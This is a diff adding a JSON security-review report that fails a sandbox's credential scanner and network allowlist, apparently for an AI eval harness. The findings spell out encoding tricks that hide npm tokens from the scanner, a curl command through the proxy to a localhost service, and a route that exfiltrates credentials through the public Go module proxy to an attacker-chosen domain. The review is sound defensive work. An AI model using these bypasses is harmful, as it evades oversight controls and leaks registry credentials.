@@ -1,0 +1,68 @@
+{
+  "verdict": "FAIL",
+  "summary": "Lane B found seven high findings; each meets decision 84’s blocking bar through a concrete credential leak or an action outside the broker.\n\nPrior findings: review 9 #2’s original scoped/unscoped npm _auth cases and review 16 B7’s quote-suffix case are fixed, with snapshot regression assertions that would fail if those fixes were undone. Reviews 1 #3/#6 and 2 #4’s original network-control failures also have fixes and regression assertions. These original-case fixes do not cover the bypasses below. Findings downgraded by decision 79 remain medium and are not re-reported as blocking.\n\nThe eval host list matches decision 79, and the inspected matcher rejects unlisted subdomains. However, localhost proxy access and Go’s upstream-fetch behavior undermine the intended boundary.\n\nNeither stage meets its proof within this lane, even excluding baselines and the desktop check. Independent typecheck passed. Scanner reproductions used the actual createSnapshot with filesystem/Git operations substituted in memory; accepted files retained their bytes without allowSecretsIn. No live credentials were used. Localhost filtering was evaluated from the pinned executable; forwarding was inspected in code, not tested end to end. The Go relay finding is an inference from documented service behavior, without a live origin receipt.\n\nThe supplied evidence is also incomplete: unit tests report three failures, the live stage 1 safety test fails, and mutation confirmation exits 2 during its control run.",
+  "remaining_for_stage0": [
+    "Close the seven blocking paths and add snapshot-level or live network regressions plus mutation coverage.",
+    "Record a superseding decision correcting decision 68’s localhost assumption and addressing public module-proxy forwarding.",
+    "Capture passing revision-linked unit/fault, live safety, and applicable confirmed mutation evidence, then re-review this lane.",
+    "Record the required baselines after approval; the user-assisted desktop check remains separate."
+  ],
+  "findings": [
+    {
+      "severity": "high",
+      "title": "Base64 credentials immediately after '=' escape fallback inspection",
+      "file": "packages/cli/src/eval/snapshot.ts",
+      "line": 159,
+      "scenario": "Let T be a synthetic npm_ token with 36 alphanumeric suffix characters, and B=Buffer.from('svc:'+T).toString('base64'). createSnapshot accepts and retains each of these: (1) .npmrc containing '//registry.npmjs.org/:_auth[]='+B; (2) .npmrc containing '//registry.npmjs.org/:_auth='+B+'\\rregistry=https://registry.npmjs.org/\\r'; (3) config.txt containing '//registry.npmjs.org/:_auth='+B, usable through npm --userconfig=config.txt; (4) .npmrc containing '//registry.npmjs.org/:${AUTH_FIELD}='+B, with AUTH_FIELD=_auth. npm’s installed INI parser, key expansion and registry-auth implementation recover the Basic credential in all four cases. Structural inspection respectively loses array normalization, CR-only line separation, filename coverage or expanded-key context; BASE64_RUN then refuses the payload because its preceding character is '='. The ordinary .npmrc control is correctly refused. Blocking: decoding B exposes an npm token usable for direct authenticated registry writes.",
+      "fix": "Inspect valid Base64 payloads after assignment separators through the complete bounded pipeline. Normalize npm arrays and line endings, handle custom config filenames and expanded keys conservatively, and add regressions for all four cases."
+    },
+    {
+      "severity": "high",
+      "title": "Word boundaries hide complete plaintext npm tokens",
+      "file": "packages/cli/src/eval/snapshot.ts",
+      "line": 127,
+      "scenario": "For T='npm_'+'a'.repeat(36), notes.txt containing 'saved='+T+'_backup' passes createSnapshot unchanged. A source string containing 'prefix'+T also passes. The leading or trailing word boundary fails even though the complete token is present and trivially recoverable by removing the surrounding text. Blocking: substituting a live write-capable token exposes a registry credential to the task.",
+      "fix": "Recognize complete npm-token substrings independently of JavaScript word boundaries. Add prefix/suffix regressions; use format or checksum validation where needed to limit false positives."
+    },
+    {
+      "severity": "high",
+      "title": "Decoded hex and byte arrays receive only private-key inspection",
+      "file": "packages/cli/src/eval/snapshot.ts",
+      "line": 696,
+      "scenario": "createSnapshot accepts a text file containing Buffer.from(T).toString('hex'), and JavaScript containing 'const value = Buffer.from(['+[...Buffer.from(T)].join(',')+']).toString();', where T is an npm-format token. Both retain recoverable token bytes. keyPayloads already decodes these representations, but its results are checked only for private-key/container formats. Blocking: the recovered npm token can authenticate writes to the allowlisted registry.",
+      "fix": "Send decoded hex, base32 and supported byte-array payloads through the same bounded credential pipeline as Base64, including npm-token detection. Add snapshot regressions using registry tokens."
+    },
+    {
+      "severity": "high",
+      "title": "Nested percent encoding bypasses npm-token inspection",
+      "file": "packages/cli/src/eval/snapshot.ts",
+      "line": 684,
+      "scenario": "Encode every character of an npm-format token T as '%25'+character.charCodeAt(0).toString(16), and track that string in doublepercent.txt. createSnapshot accepts it unchanged; decodeURIComponent(decodeURIComponent(contents)) recovers T exactly. decodedViews runs once on the original views, so the first decoded percent representation never receives another decoding pass. Blocking: a live registry credential remains recoverable inside the task.",
+      "fix": "Feed decoded text views recursively through the bounded inspection pipeline, with depth, byte and duplicate-content limits. Add a double-percent-encoded npm-token regression."
+    },
+    {
+      "severity": "high",
+      "title": "Recognizable unsupported compression retains npm credentials",
+      "file": "packages/cli/src/eval/snapshot-containers.ts",
+      "line": 130,
+      "scenario": "Create an in-memory tar containing .npmrc with '//registry.npmjs.org/:_authToken='+T, then compress it separately with zstd, bzip2 and xz. createSnapshot accepts config.tar.zst, config.tar.bz2 and config.tar.xz unchanged. None contains plaintext T; decompression and tar extraction recover it. These identifiable formats fall through the unsuccessful Brotli probe as ordinary bytes. Blocking: the retained payload contains a credential for the allowlisted write-capable registry, so decision 79’s medium downgrade does not apply.",
+      "fix": "Recognize these container signatures and either inspect bounded decompressed content or require explicit review. Add npm-bearing archive regressions for each format and their harmless controls."
+    },
+    {
+      "severity": "high",
+      "title": "Localhost allowlisting reaches privileged services through the proxy",
+      "file": "packages/cli/src/eval/baseline.ts",
+      "line": 48,
+      "scenario": "The accepted eval list includes bare localhost and 127.0.0.1. The pinned Claude executable’s network filter allows both on arbitrary ports even with allowLocalBinding=false; the runtime’s resolved-address guard also permits localhost resolving to loopback. Thus 'curl --noproxy \"\" -X POST http://127.0.0.1:43123/send' can use the sandbox proxy to reach an existing unsandboxed local service. A runner-side fixture whose /send handler writes outside the worktree or sends a notification demonstrates the broker bypass. The tripwire permits this command. Credential URLs such as http://svc:Review9Opaque@localhost:43123/send also pass scanning because LOCAL_HOSTS exempts them. Blocking: an existing local service can perform an outside action or accept a retained credential. Decision 68’s claim that no local port is reachable without allowLocalBinding is false for proxied traffic.",
+      "fix": "Remove blanket loopback access from task/eval policies or enforce a runner-owned, narrowly scoped endpoint proxy. Add live tests against an unsandboxed localhost fixture using explicit proxy routing, with allowLocalBinding disabled."
+    },
+    {
+      "severity": "high",
+      "title": "The public Go proxy provides an indirect credential-exfiltration route",
+      "file": "packages/cli/src/eval/baseline.ts",
+      "line": 48,
+      "scenario": "A task can hex-encode a snapshot credential and request https://proxy.golang.org/<attacker-controlled-domain>/<hex-data>/@v/list. On an uncached vanity module, the mirror discovers the origin using a request to https://<attacker-controlled-domain>/<hex-data>?go-get=1; the origin receives the encoded credential even though the task contacts only an allowlisted host. No successful module publication is required for discovery. This follows from the [Go module service documentation](https://proxy.golang.org/) and [module discovery protocol](https://go.dev/ref/mod#vcs-find), rather than a live origin receipt in this review. Blocking: credentials missed under decision 79’s best-effort policy can reach an unlisted recipient, defeating the compensating network control.",
+      "fix": "Use a runner-owned dependency cache or fetch proxy restricted to approved dependency paths, and remove direct task access to the public discovery service. Enforce path restrictions outside task control; setting GOPROXY alone is insufficient. Add a controlled-origin test proving task-chosen data cannot trigger an origin request."
+    }
+  ]
+}
